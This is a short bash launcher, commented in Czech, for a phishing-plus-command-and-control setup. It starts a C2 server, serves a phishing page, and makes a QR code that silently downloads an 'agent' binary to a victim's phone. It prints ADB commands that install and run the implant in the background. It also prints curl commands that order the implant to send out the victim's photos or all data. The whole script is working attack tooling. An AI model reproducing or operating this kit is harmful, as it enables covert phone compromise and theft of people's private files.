#!/bin/bash
# 🚀 QR scénář startér: C2 server + phishing stránka + QR kód
# Použití: ./start.sh
set -e
cd "$(dirname "$0")"

cp ../dist/agent-arm64 ./agent
LAN=$(ip -4 addr show | grep inet | grep -v 127.0.0.1 | head -1 | awk '{print $2}' | cut -d/ -f1)

# Spusť C2 (ukončí se s Ctrl+C)
python3 c2-qr.py &
C2_PID=$!
trap "kill $C2_PID 2>/dev/null" EXIT
sleep 2

command -v qrencode >/dev/null || apt-get install -y qrencode >/dev/null 2>&1 || true
qrencode -o qr.png "http://${LAN}:8080/" 2>/dev/null && echo "✅ QR: qr.png"

cat <<EOF

================= QR SCÉNÁŘ =================
Phishing:  http://${LAN}:8080/
Dashboard: http://${LAN}:8080/dashboard
QR soubor: qr.png  (odkaz: http://${LAN}:8080/)

Oběť naskenuje QR → sama se stáhne 'agent' do Stahování.

Spuštění na telefonu (ADB):
  adb shell "cp /sdcard/Download/agent /data/local/tmp/agent && chmod 755 /data/local/tmp/agent"
  adb shell "nohup /data/local/tmp/agent -mode poll -c2 http://${LAN}:8080 -id redmi >/dev/null 2>&1 &"

Ovládání:
  curl "http://${LAN}:8080/push?id=redmi&cmd=info"
  curl "http://${LAN}:8080/push?id=redmi&cmd=exfil_photos"
  curl "http://${LAN}:8080/push?id=redmi&cmd=exfil_all"
  curl "http://${LAN}:8080/push?id=redmi&cmd=stop"

POZOR: /sdcard je noexec → binár odtud nelze spustit, nutný ADB push do /data/local/tmp.
============================================
Ctrl+C pro zastavení C2.
EOF

wait $C2_PID
